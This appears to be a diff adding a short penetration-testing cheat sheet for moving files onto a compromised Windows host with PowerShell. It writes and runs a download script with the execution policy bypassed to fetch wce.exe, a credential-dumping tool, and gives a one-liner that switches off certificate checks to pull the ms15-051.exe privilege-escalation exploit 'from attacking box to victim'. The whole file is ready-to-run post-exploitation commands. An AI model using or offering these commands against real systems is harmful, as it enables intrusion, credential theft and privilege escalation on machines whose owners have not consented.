@@ -1,0 +1,11 @@
+# Transfer with powershell
+echo $storageDir = $pwd > wget.ps1
+echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+echo $url = "http://192.168.56.1/wce.exe" >>wget.ps1
+echo $file = "wce.exe" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+
+# Transfer file from attacking box to victim in one line
+powershell.exe -noprofile -noninteractive -command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; $source="""http://192.168.56.1/ms15-051.exe"""; $destination="""C:\tmp\ms15-051.exe"""; $http=new-object System.Net.WebClient; $response=$http.DownloadFile($source,$destination);"
